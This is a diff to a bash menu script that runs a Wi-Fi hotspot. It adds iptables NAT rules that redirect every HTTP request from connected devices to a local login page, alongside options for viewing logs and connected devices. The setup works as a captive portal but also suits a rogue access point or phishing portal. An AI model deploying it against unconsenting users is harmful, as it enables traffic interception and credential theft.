@@ -19,7 +19,7 @@ setup() {
 
     echo "[+] Installing dependencies..."
     sudo apt update
-    sudo apt install hostapd dnsmasq php-cli -y
+    sudo apt install hostapd dnsmasq php-cli iptables -y
     echo "[+] Setup complete!"
 }
 
@@ -44,10 +44,10 @@ EOF
 }
 
 # ---------------------------
-# Start hotspot (hotspot-only mode)
+# Start hotspot + captive portal
 # ---------------------------
 start_hotspot() {
-    echo "[+] Starting hotspot on $HOTSPOT_IFACE (hotspot-only)..."
+    echo "[+] Starting hotspot on $HOTSPOT_IFACE..."
 
     create_configs
 
@@ -56,11 +56,20 @@ start_hotspot() {
     sudo ip addr add 192.168.50.1/24 dev $HOTSPOT_IFACE
     sudo ip link set $HOTSPOT_IFACE up
 
+    # Enable IP forwarding
+    sudo sysctl -w net.ipv4.ip_forward=1
+
+    # Start hostapd & dnsmasq
     sudo hostapd $HOSTAPD_CONF -B
     sudo dnsmasq -C $DNSMASQ_CONF
 
-    echo "[+] Hotspot started. Devices can connect to $SSID."
-    echo "    IP range: 192.168.50.2 - 192.168.50.50"
+    # Redirect all HTTP traffic to local portal
+    sudo iptables -t nat -A PREROUTING -i $HOTSPOT_IFACE -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
+    sudo iptables -t nat -A POSTROUTING -o $HOTSPOT_IFACE -j MASQUERADE
+
+    echo "[+] Hotspot started with captive portal."
+    echo "    Connect your device to SSID: $SSID"
+    echo "    Devices will be redirected to the login page automatically."
 }
 
 # ---------------------------
@@ -68,8 +77,16 @@ start_hotspot() {
 # ---------------------------
 stop_hotspot() {
     echo "[+] Stopping hotspot..."
+
     sudo pkill hostapd
     sudo pkill dnsmasq
+
+    # Remove iptables rules
+    sudo iptables -t nat -F
+    sudo iptables -t nat -X
+
+    sudo sysctl -w net.ipv4.ip_forward=0
+
     echo "[+] Hotspot stopped."
 }
 
@@ -94,10 +111,14 @@ show_devices() {
 }
 
 # ---------------------------
-# View / live logs
+# Logs
 # ---------------------------
 view_logs() { cat "$LOG_FILE"; }
 live_logs() { tail -f "$LOG_FILE"; }
+
+# ---------------------------
+# Edit page
+# ---------------------------
 edit_page() { nano "$PORTAL_DIR/index.html"; }
 
 # ---------------------------
@@ -105,9 +126,9 @@ edit_page() { nano "$PORTAL_DIR/index.html"; }
 # ---------------------------
 while true; do
     echo ""
-    echo "====== Hotspot-Only WiFi Portal Tool ======"
+    echo "====== Captive Portal Wi-Fi Tool ======"
     echo "1) Setup"
-    echo "2) Start Hotspot"
+    echo "2) Start Hotspot + Captive Portal"
     echo "3) Stop Hotspot"
     echo "4) Start Login Page"
     echo "5) Show Connected Devices"
@@ -115,7 +136,7 @@ while true; do
     echo "7) Live Logs"
     echo "8) Edit Page"
     echo "9) Exit"
-    echo "=========================================="
+    echo "======================================"
     read -p "Select option: " choice
 
     case $choice in
